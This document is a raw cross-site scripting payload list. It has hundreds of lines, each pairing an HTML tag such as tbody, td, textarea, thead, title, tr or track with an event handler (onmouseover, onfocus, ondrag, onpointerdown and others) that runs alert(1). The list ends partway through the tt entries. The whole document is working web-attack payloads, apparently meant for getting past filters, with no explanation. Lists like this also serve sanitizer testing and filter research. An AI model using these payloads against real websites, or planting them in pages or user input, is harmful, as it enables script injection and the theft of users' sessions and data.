<tbody contenteditable onbeforeinput=alert(1)>test
<tbody draggable="true" ondrag="alert(1)" style=display:block>test</tbody>
<tbody draggable="true" ondragend="alert(1)" style=display:block>test</tbody>
<tbody draggable="true" ondragenter="alert(1)" style=display:block>test</tbody>
<tbody draggable="true" ondragleave="alert(1)" style=display:block>test</tbody>
<tbody draggable="true" ondragstart="alert(1)" style=display:block>test</tbody>
<tbody id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></tbody>
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>
<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>
<tbody onafterscriptexecute=alert(1)><script>1</script>
<tbody onbeforecopy="alert(1)" contenteditable>test</tbody>
<tbody onbeforecut="alert(1)" contenteditable>test</tbody>
<tbody onbeforescriptexecute=alert(1)><script>1</script>
<tbody onblur=alert(1) id=x tabindex=1 style=display:block>test</tbody><input value=clickme>
<tbody onclick="alert(1)" style=display:block>test</tbody>
<tbody oncontextmenu="alert(1)" style=display:block>test</tbody>
<tbody oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<tbody oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<tbody ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</tbody>
<tbody onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</tbody><input value=clickme>
<tbody onkeydown="alert(1)" contenteditable style=display:block>test</tbody>
<tbody onkeypress="alert(1)" contenteditable style=display:block>test</tbody>
<tbody onkeyup="alert(1)" contenteditable style=display:block>test</tbody>
<tbody onmousedown="alert(1)" style=display:block>test</tbody>
<tbody onmouseenter="alert(1)" style=display:block>test</tbody>
<tbody onmouseleave="alert(1)" style=display:block>test</tbody>
<tbody onmousemove="alert(1)" style=display:block>test</tbody>
<tbody onmouseout="alert(1)" style=display:block>test</tbody>
<tbody onmouseover="alert(1)" style=display:block>test</tbody>
<tbody onmouseup="alert(1)" style=display:block>test</tbody>
<tbody onmousewheel=alert(1) style=display:block>requires scrolling
<tbody onpaste="alert(1)" contenteditable>test</tbody>
<tbody onpointerdown=alert(1) style=display:block>XSS</tbody>
<tbody onpointerenter=alert(1) style=display:block>XSS</tbody>
<tbody onpointerleave=alert(1) style=display:block>XSS</tbody>
<tbody onpointermove=alert(1) style=display:block>XSS</tbody>
<tbody onpointerout=alert(1) style=display:block>XSS</tbody>
<tbody onpointerover=alert(1) style=display:block>XSS</tbody>
<tbody onpointerrawupdate=alert(1) style=display:block>XSS</tbody>
<tbody onpointerup=alert(1) style=display:block>XSS</tbody>
<tbody onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></tbody>
<td contenteditable onbeforeinput=alert(1)>test
<td draggable="true" ondrag="alert(1)" style=display:block>test</td>
<td draggable="true" ondragend="alert(1)" style=display:block>test</td>
<td draggable="true" ondragenter="alert(1)" style=display:block>test</td>
<td draggable="true" ondragleave="alert(1)" style=display:block>test</td>
<td draggable="true" ondragstart="alert(1)" style=display:block>test</td>
<td id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></td>
<td id=x tabindex=1 onfocus=alert(1)></td>
<td id=x tabindex=1 onfocusin=alert(1)></td>
<td onafterscriptexecute=alert(1)><script>1</script>
<td onbeforecopy="alert(1)" contenteditable>test</td>
<td onbeforecut="alert(1)" contenteditable>test</td>
<td onbeforescriptexecute=alert(1)><script>1</script>
<td onblur=alert(1) id=x tabindex=1 style=display:block>test</td><input value=clickme>
<td onclick="alert(1)" style=display:block>test</td>
<td oncontextmenu="alert(1)" style=display:block>test</td>
<td oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<td oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<td ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</td>
<td onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</td><input value=clickme>
<td onkeydown="alert(1)" contenteditable style=display:block>test</td>
<td onkeypress="alert(1)" contenteditable style=display:block>test</td>
<td onkeyup="alert(1)" contenteditable style=display:block>test</td>
<td onmousedown="alert(1)" style=display:block>test</td>
<td onmouseenter="alert(1)" style=display:block>test</td>
<td onmouseleave="alert(1)" style=display:block>test</td>
<td onmousemove="alert(1)" style=display:block>test</td>
<td onmouseout="alert(1)" style=display:block>test</td>
<td onmouseover="alert(1)" style=display:block>test</td>
<td onmouseup="alert(1)" style=display:block>test</td>
<td onmousewheel=alert(1) style=display:block>requires scrolling
<td onpaste="alert(1)" contenteditable>test</td>
<td onpointerdown=alert(1) style=display:block>XSS</td>
<td onpointerenter=alert(1) style=display:block>XSS</td>
<td onpointerleave=alert(1) style=display:block>XSS</td>
<td onpointermove=alert(1) style=display:block>XSS</td>
<td onpointerout=alert(1) style=display:block>XSS</td>
<td onpointerover=alert(1) style=display:block>XSS</td>
<td onpointerrawupdate=alert(1) style=display:block>XSS</td>
<td onpointerup=alert(1) style=display:block>XSS</td>
<td onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></td>
<template contenteditable onbeforeinput=alert(1)>test
<template draggable="true" ondrag="alert(1)" style=display:block>test</template>
<template draggable="true" ondragend="alert(1)" style=display:block>test</template>
<template draggable="true" ondragenter="alert(1)" style=display:block>test</template>
<template draggable="true" ondragleave="alert(1)" style=display:block>test</template>
<template draggable="true" ondragstart="alert(1)" style=display:block>test</template>
<template id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></template>
<template id=x tabindex=1 onfocus=alert(1)></template>
<template id=x tabindex=1 onfocusin=alert(1)></template>
<template onafterscriptexecute=alert(1)><script>1</script>
<template onbeforecopy="alert(1)" contenteditable>test</template>
<template onbeforecut="alert(1)" contenteditable>test</template>
<template onbeforescriptexecute=alert(1)><script>1</script>
<template onblur=alert(1) id=x tabindex=1 style=display:block>test</template><input value=clickme>
<template onclick="alert(1)" style=display:block>test</template>
<template oncontextmenu="alert(1)" style=display:block>test</template>
<template oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<template oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<template ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</template>
<template onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</template><input value=clickme>
<template onkeydown="alert(1)" contenteditable style=display:block>test</template>
<template onkeypress="alert(1)" contenteditable style=display:block>test</template>
<template onkeyup="alert(1)" contenteditable style=display:block>test</template>
<template onmousedown="alert(1)" style=display:block>test</template>
<template onmouseenter="alert(1)" style=display:block>test</template>
<template onmouseleave="alert(1)" style=display:block>test</template>
<template onmousemove="alert(1)" style=display:block>test</template>
<template onmouseout="alert(1)" style=display:block>test</template>
<template onmouseover="alert(1)" style=display:block>test</template>
<template onmouseup="alert(1)" style=display:block>test</template>
<template onmousewheel=alert(1) style=display:block>requires scrolling
<template onpaste="alert(1)" contenteditable>test</template>
<template onpointerdown=alert(1) style=display:block>XSS</template>
<template onpointerenter=alert(1) style=display:block>XSS</template>
<template onpointerleave=alert(1) style=display:block>XSS</template>
<template onpointermove=alert(1) style=display:block>XSS</template>
<template onpointerout=alert(1) style=display:block>XSS</template>
<template onpointerover=alert(1) style=display:block>XSS</template>
<template onpointerrawupdate=alert(1) style=display:block>XSS</template>
<template onpointerup=alert(1) style=display:block>XSS</template>
<template onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></template>
<textarea autofocus onfocus=alert(1)>test</textarea>
<textarea autofocus onfocusin=alert(1)>test</textarea>
<textarea contenteditable onbeforeinput=alert(1)>test
<textarea draggable="true" ondrag="alert(1)" style=display:block>test</textarea>
<textarea draggable="true" ondragend="alert(1)" style=display:block>test</textarea>
<textarea draggable="true" ondragenter="alert(1)" style=display:block>test</textarea>
<textarea draggable="true" ondragleave="alert(1)" style=display:block>test</textarea>
<textarea draggable="true" ondragstart="alert(1)" style=display:block>test</textarea>
<textarea id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></textarea>
<textarea onafterscriptexecute=alert(1)><script>1</script>
<textarea onauxclick=alert(1)>XSS</textarea>
<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
<textarea onbeforecut=alert(1) autofocus>XSS</textarea>
<textarea onbeforescriptexecute=alert(1)><script>1</script>
<textarea onblur=alert(1) id=x tabindex=1 style=display:block>test</textarea><input value=clickme>
<textarea onchange=alert(1)>XSS</textarea>
<textarea onclick="alert(1)" style=display:block>test</textarea>
<textarea oncontextmenu="alert(1)" style=display:block>test</textarea>
<textarea oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<textarea oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<textarea ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</textarea>
<textarea onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</textarea><input value=clickme>
<textarea oninput=alert(1)>XSS</textarea>
<textarea onkeydown="alert(1)" contenteditable style=display:block>test</textarea>
<textarea onkeypress="alert(1)" contenteditable style=display:block>test</textarea>
<textarea onkeyup="alert(1)" contenteditable style=display:block>test</textarea>
<textarea onmousedown="alert(1)" style=display:block>test</textarea>
<textarea onmouseenter="alert(1)" style=display:block>test</textarea>
<textarea onmouseleave="alert(1)" style=display:block>test</textarea>
<textarea onmousemove="alert(1)" style=display:block>test</textarea>
<textarea onmouseout="alert(1)" style=display:block>test</textarea>
<textarea onmouseover="alert(1)" style=display:block>test</textarea>
<textarea onmouseup="alert(1)" style=display:block>test</textarea>
<textarea onmousewheel=alert(1) style=display:block>requires scrolling
<textarea onpaste=alert(1) autofocus></textarea>
<textarea onpointerdown=alert(1) style=display:block>XSS</textarea>
<textarea onpointerenter=alert(1) style=display:block>XSS</textarea>
<textarea onpointerleave=alert(1) style=display:block>XSS</textarea>
<textarea onpointermove=alert(1) style=display:block>XSS</textarea>
<textarea onpointerout=alert(1) style=display:block>XSS</textarea>
<textarea onpointerover=alert(1) style=display:block>XSS</textarea>
<textarea onpointerrawupdate=alert(1) style=display:block>XSS</textarea>
<textarea onpointerup=alert(1) style=display:block>XSS</textarea>
<textarea onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></textarea>
<textarea onselect=alert(1) autofocus>XSS</textarea>
<tfoot contenteditable onbeforeinput=alert(1)>test
<tfoot draggable="true" ondrag="alert(1)" style=display:block>test</tfoot>
<tfoot draggable="true" ondragend="alert(1)" style=display:block>test</tfoot>
<tfoot draggable="true" ondragenter="alert(1)" style=display:block>test</tfoot>
<tfoot draggable="true" ondragleave="alert(1)" style=display:block>test</tfoot>
<tfoot draggable="true" ondragstart="alert(1)" style=display:block>test</tfoot>
<tfoot id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></tfoot>
<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>
<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>
<tfoot onafterscriptexecute=alert(1)><script>1</script>
<tfoot onbeforecopy="alert(1)" contenteditable>test</tfoot>
<tfoot onbeforecut="alert(1)" contenteditable>test</tfoot>
<tfoot onbeforescriptexecute=alert(1)><script>1</script>
<tfoot onblur=alert(1) id=x tabindex=1 style=display:block>test</tfoot><input value=clickme>
<tfoot onclick="alert(1)" style=display:block>test</tfoot>
<tfoot oncontextmenu="alert(1)" style=display:block>test</tfoot>
<tfoot oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<tfoot oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<tfoot ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</tfoot>
<tfoot onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</tfoot><input value=clickme>
<tfoot onkeydown="alert(1)" contenteditable style=display:block>test</tfoot>
<tfoot onkeypress="alert(1)" contenteditable style=display:block>test</tfoot>
<tfoot onkeyup="alert(1)" contenteditable style=display:block>test</tfoot>
<tfoot onmousedown="alert(1)" style=display:block>test</tfoot>
<tfoot onmouseenter="alert(1)" style=display:block>test</tfoot>
<tfoot onmouseleave="alert(1)" style=display:block>test</tfoot>
<tfoot onmousemove="alert(1)" style=display:block>test</tfoot>
<tfoot onmouseout="alert(1)" style=display:block>test</tfoot>
<tfoot onmouseover="alert(1)" style=display:block>test</tfoot>
<tfoot onmouseup="alert(1)" style=display:block>test</tfoot>
<tfoot onmousewheel=alert(1) style=display:block>requires scrolling
<tfoot onpaste="alert(1)" contenteditable>test</tfoot>
<tfoot onpointerdown=alert(1) style=display:block>XSS</tfoot>
<tfoot onpointerenter=alert(1) style=display:block>XSS</tfoot>
<tfoot onpointerleave=alert(1) style=display:block>XSS</tfoot>
<tfoot onpointermove=alert(1) style=display:block>XSS</tfoot>
<tfoot onpointerout=alert(1) style=display:block>XSS</tfoot>
<tfoot onpointerover=alert(1) style=display:block>XSS</tfoot>
<tfoot onpointerrawupdate=alert(1) style=display:block>XSS</tfoot>
<tfoot onpointerup=alert(1) style=display:block>XSS</tfoot>
<tfoot onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></tfoot>
<th contenteditable onbeforeinput=alert(1)>test
<th draggable="true" ondrag="alert(1)" style=display:block>test</th>
<th draggable="true" ondragend="alert(1)" style=display:block>test</th>
<th draggable="true" ondragenter="alert(1)" style=display:block>test</th>
<th draggable="true" ondragleave="alert(1)" style=display:block>test</th>
<th draggable="true" ondragstart="alert(1)" style=display:block>test</th>
<th id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></th>
<th id=x tabindex=1 onfocus=alert(1)></th>
<th id=x tabindex=1 onfocusin=alert(1)></th>
<th onafterscriptexecute=alert(1)><script>1</script>
<th onbeforecopy="alert(1)" contenteditable>test</th>
<th onbeforecut="alert(1)" contenteditable>test</th>
<th onbeforescriptexecute=alert(1)><script>1</script>
<th onblur=alert(1) id=x tabindex=1 style=display:block>test</th><input value=clickme>
<th onclick="alert(1)" style=display:block>test</th>
<th oncontextmenu="alert(1)" style=display:block>test</th>
<th oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<th oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<th ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</th>
<th onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</th><input value=clickme>
<th onkeydown="alert(1)" contenteditable style=display:block>test</th>
<th onkeypress="alert(1)" contenteditable style=display:block>test</th>
<th onkeyup="alert(1)" contenteditable style=display:block>test</th>
<th onmousedown="alert(1)" style=display:block>test</th>
<th onmouseenter="alert(1)" style=display:block>test</th>
<th onmouseleave="alert(1)" style=display:block>test</th>
<th onmousemove="alert(1)" style=display:block>test</th>
<th onmouseout="alert(1)" style=display:block>test</th>
<th onmouseover="alert(1)" style=display:block>test</th>
<th onmouseup="alert(1)" style=display:block>test</th>
<th onmousewheel=alert(1) style=display:block>requires scrolling
<th onpaste="alert(1)" contenteditable>test</th>
<th onpointerdown=alert(1) style=display:block>XSS</th>
<th onpointerenter=alert(1) style=display:block>XSS</th>
<th onpointerleave=alert(1) style=display:block>XSS</th>
<th onpointermove=alert(1) style=display:block>XSS</th>
<th onpointerout=alert(1) style=display:block>XSS</th>
<th onpointerover=alert(1) style=display:block>XSS</th>
<th onpointerrawupdate=alert(1) style=display:block>XSS</th>
<th onpointerup=alert(1) style=display:block>XSS</th>
<th onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></th>
<thead contenteditable onbeforeinput=alert(1)>test
<thead draggable="true" ondrag="alert(1)" style=display:block>test</thead>
<thead draggable="true" ondragend="alert(1)" style=display:block>test</thead>
<thead draggable="true" ondragenter="alert(1)" style=display:block>test</thead>
<thead draggable="true" ondragleave="alert(1)" style=display:block>test</thead>
<thead draggable="true" ondragstart="alert(1)" style=display:block>test</thead>
<thead id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></thead>
<thead id=x tabindex=1 onfocus=alert(1)></thead>
<thead id=x tabindex=1 onfocusin=alert(1)></thead>
<thead onafterscriptexecute=alert(1)><script>1</script>
<thead onbeforecopy="alert(1)" contenteditable>test</thead>
<thead onbeforecut="alert(1)" contenteditable>test</thead>
<thead onbeforescriptexecute=alert(1)><script>1</script>
<thead onblur=alert(1) id=x tabindex=1 style=display:block>test</thead><input value=clickme>
<thead onclick="alert(1)" style=display:block>test</thead>
<thead oncontextmenu="alert(1)" style=display:block>test</thead>
<thead oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<thead oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<thead ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</thead>
<thead onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</thead><input value=clickme>
<thead onkeydown="alert(1)" contenteditable style=display:block>test</thead>
<thead onkeypress="alert(1)" contenteditable style=display:block>test</thead>
<thead onkeyup="alert(1)" contenteditable style=display:block>test</thead>
<thead onmousedown="alert(1)" style=display:block>test</thead>
<thead onmouseenter="alert(1)" style=display:block>test</thead>
<thead onmouseleave="alert(1)" style=display:block>test</thead>
<thead onmousemove="alert(1)" style=display:block>test</thead>
<thead onmouseout="alert(1)" style=display:block>test</thead>
<thead onmouseover="alert(1)" style=display:block>test</thead>
<thead onmouseup="alert(1)" style=display:block>test</thead>
<thead onmousewheel=alert(1) style=display:block>requires scrolling
<thead onpaste="alert(1)" contenteditable>test</thead>
<thead onpointerdown=alert(1) style=display:block>XSS</thead>
<thead onpointerenter=alert(1) style=display:block>XSS</thead>
<thead onpointerleave=alert(1) style=display:block>XSS</thead>
<thead onpointermove=alert(1) style=display:block>XSS</thead>
<thead onpointerout=alert(1) style=display:block>XSS</thead>
<thead onpointerover=alert(1) style=display:block>XSS</thead>
<thead onpointerrawupdate=alert(1) style=display:block>XSS</thead>
<thead onpointerup=alert(1) style=display:block>XSS</thead>
<thead onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></thead>
<time contenteditable onbeforeinput=alert(1)>test
<time draggable="true" ondrag="alert(1)" style=display:block>test</time>
<time draggable="true" ondragend="alert(1)" style=display:block>test</time>
<time draggable="true" ondragenter="alert(1)" style=display:block>test</time>
<time draggable="true" ondragleave="alert(1)" style=display:block>test</time>
<time draggable="true" ondragstart="alert(1)" style=display:block>test</time>
<time id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></time>
<time id=x tabindex=1 onfocus=alert(1)></time>
<time id=x tabindex=1 onfocusin=alert(1)></time>
<time onafterscriptexecute=alert(1)><script>1</script>
<time onbeforecopy="alert(1)" contenteditable>test</time>
<time onbeforecut="alert(1)" contenteditable>test</time>
<time onbeforescriptexecute=alert(1)><script>1</script>
<time onblur=alert(1) id=x tabindex=1 style=display:block>test</time><input value=clickme>
<time onclick="alert(1)" style=display:block>test</time>
<time oncontextmenu="alert(1)" style=display:block>test</time>
<time oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<time oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<time ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</time>
<time onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</time><input value=clickme>
<time onkeydown="alert(1)" contenteditable style=display:block>test</time>
<time onkeypress="alert(1)" contenteditable style=display:block>test</time>
<time onkeyup="alert(1)" contenteditable style=display:block>test</time>
<time onmousedown="alert(1)" style=display:block>test</time>
<time onmouseenter="alert(1)" style=display:block>test</time>
<time onmouseleave="alert(1)" style=display:block>test</time>
<time onmousemove="alert(1)" style=display:block>test</time>
<time onmouseout="alert(1)" style=display:block>test</time>
<time onmouseover="alert(1)" style=display:block>test</time>
<time onmouseup="alert(1)" style=display:block>test</time>
<time onmousewheel=alert(1) style=display:block>requires scrolling
<time onpaste="alert(1)" contenteditable>test</time>
<time onpointerdown=alert(1) style=display:block>XSS</time>
<time onpointerenter=alert(1) style=display:block>XSS</time>
<time onpointerleave=alert(1) style=display:block>XSS</time>
<time onpointermove=alert(1) style=display:block>XSS</time>
<time onpointerout=alert(1) style=display:block>XSS</time>
<time onpointerover=alert(1) style=display:block>XSS</time>
<time onpointerrawupdate=alert(1) style=display:block>XSS</time>
<time onpointerup=alert(1) style=display:block>XSS</time>
<time onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></time>
<title contenteditable onbeforeinput=alert(1)>test
<title draggable="true" ondrag="alert(1)" style=display:block>test</title>
<title draggable="true" ondragend="alert(1)" style=display:block>test</title>
<title draggable="true" ondragenter="alert(1)" style=display:block>test</title>
<title draggable="true" ondragleave="alert(1)" style=display:block>test</title>
<title draggable="true" ondragstart="alert(1)" style=display:block>test</title>
<title id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></title>
<title id=x tabindex=1 onfocus=alert(1)></title>
<title id=x tabindex=1 onfocusin=alert(1)></title>
<title onafterscriptexecute=alert(1)><script>1</script>
<title onbeforecopy="alert(1)" contenteditable>test</title>
<title onbeforecut="alert(1)" contenteditable>test</title>
<title onbeforescriptexecute=alert(1)><script>1</script>
<title onblur=alert(1) id=x tabindex=1 style=display:block>test</title><input value=clickme>
<title onclick="alert(1)" style=display:block>test</title>
<title oncontextmenu="alert(1)" style=display:block>test</title>
<title oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<title oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<title ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</title>
<title onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</title><input value=clickme>
<title onkeydown="alert(1)" contenteditable style=display:block>test</title>
<title onkeypress="alert(1)" contenteditable style=display:block>test</title>
<title onkeyup="alert(1)" contenteditable style=display:block>test</title>
<title onmousedown="alert(1)" style=display:block>test</title>
<title onmouseenter="alert(1)" style=display:block>test</title>
<title onmouseleave="alert(1)" style=display:block>test</title>
<title onmousemove="alert(1)" style=display:block>test</title>
<title onmouseout="alert(1)" style=display:block>test</title>
<title onmouseover="alert(1)" style=display:block>test</title>
<title onmouseup="alert(1)" style=display:block>test</title>
<title onmousewheel=alert(1) style=display:block>requires scrolling
<title onpaste="alert(1)" contenteditable>test</title>
<title onpointerdown=alert(1) style=display:block>XSS</title>
<title onpointerenter=alert(1) style=display:block>XSS</title>
<title onpointerleave=alert(1) style=display:block>XSS</title>
<title onpointermove=alert(1) style=display:block>XSS</title>
<title onpointerout=alert(1) style=display:block>XSS</title>
<title onpointerover=alert(1) style=display:block>XSS</title>
<title onpointerrawupdate=alert(1) style=display:block>XSS</title>
<title onpointerup=alert(1) style=display:block>XSS</title>
<title onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></title>
<tr contenteditable onbeforeinput=alert(1)>test
<tr draggable="true" ondrag="alert(1)" style=display:block>test</tr>
<tr draggable="true" ondragend="alert(1)" style=display:block>test</tr>
<tr draggable="true" ondragenter="alert(1)" style=display:block>test</tr>
<tr draggable="true" ondragleave="alert(1)" style=display:block>test</tr>
<tr draggable="true" ondragstart="alert(1)" style=display:block>test</tr>
<tr id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></tr>
<tr id=x tabindex=1 onfocus=alert(1)></tr>
<tr id=x tabindex=1 onfocusin=alert(1)></tr>
<tr onafterscriptexecute=alert(1)><script>1</script>
<tr onbeforecopy="alert(1)" contenteditable>test</tr>
<tr onbeforecut="alert(1)" contenteditable>test</tr>
<tr onbeforescriptexecute=alert(1)><script>1</script>
<tr onblur=alert(1) id=x tabindex=1 style=display:block>test</tr><input value=clickme>
<tr onclick="alert(1)" style=display:block>test</tr>
<tr oncontextmenu="alert(1)" style=display:block>test</tr>
<tr oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<tr oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<tr ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</tr>
<tr onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</tr><input value=clickme>
<tr onkeydown="alert(1)" contenteditable style=display:block>test</tr>
<tr onkeypress="alert(1)" contenteditable style=display:block>test</tr>
<tr onkeyup="alert(1)" contenteditable style=display:block>test</tr>
<tr onmousedown="alert(1)" style=display:block>test</tr>
<tr onmouseenter="alert(1)" style=display:block>test</tr>
<tr onmouseleave="alert(1)" style=display:block>test</tr>
<tr onmousemove="alert(1)" style=display:block>test</tr>
<tr onmouseout="alert(1)" style=display:block>test</tr>
<tr onmouseover="alert(1)" style=display:block>test</tr>
<tr onmouseup="alert(1)" style=display:block>test</tr>
<tr onmousewheel=alert(1) style=display:block>requires scrolling
<tr onpaste="alert(1)" contenteditable>test</tr>
<tr onpointerdown=alert(1) style=display:block>XSS</tr>
<tr onpointerenter=alert(1) style=display:block>XSS</tr>
<tr onpointerleave=alert(1) style=display:block>XSS</tr>
<tr onpointermove=alert(1) style=display:block>XSS</tr>
<tr onpointerout=alert(1) style=display:block>XSS</tr>
<tr onpointerover=alert(1) style=display:block>XSS</tr>
<tr onpointerrawupdate=alert(1) style=display:block>XSS</tr>
<tr onpointerup=alert(1) style=display:block>XSS</tr>
<tr onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></tr>
<track contenteditable onbeforeinput=alert(1)>test
<track draggable="true" ondrag="alert(1)" style=display:block>test</track>
<track draggable="true" ondragend="alert(1)" style=display:block>test</track>
<track draggable="true" ondragenter="alert(1)" style=display:block>test</track>
<track draggable="true" ondragleave="alert(1)" style=display:block>test</track>
<track draggable="true" ondragstart="alert(1)" style=display:block>test</track>
<track id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></track>
<track id=x tabindex=1 onfocus=alert(1)></track>
<track id=x tabindex=1 onfocusin=alert(1)></track>
<track onafterscriptexecute=alert(1)><script>1</script>
<track onbeforecopy="alert(1)" contenteditable>test</track>
<track onbeforecut="alert(1)" contenteditable>test</track>
<track onbeforescriptexecute=alert(1)><script>1</script>
<track onblur=alert(1) id=x tabindex=1 style=display:block>test</track><input value=clickme>
<track onclick="alert(1)" style=display:block>test</track>
<track oncontextmenu="alert(1)" style=display:block>test</track>
<track oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<track oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<track ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</track>
<track onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</track><input value=clickme>
<track onkeydown="alert(1)" contenteditable style=display:block>test</track>
<track onkeypress="alert(1)" contenteditable style=display:block>test</track>
<track onkeyup="alert(1)" contenteditable style=display:block>test</track>
<track onmousedown="alert(1)" style=display:block>test</track>
<track onmouseenter="alert(1)" style=display:block>test</track>
<track onmouseleave="alert(1)" style=display:block>test</track>
<track onmousemove="alert(1)" style=display:block>test</track>
<track onmouseout="alert(1)" style=display:block>test</track>
<track onmouseover="alert(1)" style=display:block>test</track>
<track onmouseup="alert(1)" style=display:block>test</track>
<track onmousewheel=alert(1) style=display:block>requires scrolling
<track onpaste="alert(1)" contenteditable>test</track>
<track onpointerdown=alert(1) style=display:block>XSS</track>
<track onpointerenter=alert(1) style=display:block>XSS</track>
<track onpointerleave=alert(1) style=display:block>XSS</track>
<track onpointermove=alert(1) style=display:block>XSS</track>
<track onpointerout=alert(1) style=display:block>XSS</track>
<track onpointerover=alert(1) style=display:block>XSS</track>
<track onpointerrawupdate=alert(1) style=display:block>XSS</track>
<track onpointerup=alert(1) style=display:block>XSS</track>
<track onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></track>
<tt contenteditable onbeforeinput=alert(1)>test
<tt draggable="true" ondrag="alert(1)" style=display:block>test</tt>
<tt draggable="true" ondragend="alert(1)" style=display:block>test</tt>
<tt draggable="true" ondragenter="alert(1)" style=display:block>test</tt>
<tt draggable="true" ondragleave="alert(1)" style=display:block>test</tt>
<tt draggable="true" ondragstart="alert(1)" style=display:block>test</tt>
<tt id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></tt>
<tt id=x tabindex=1 onfocus=alert(1)></tt>
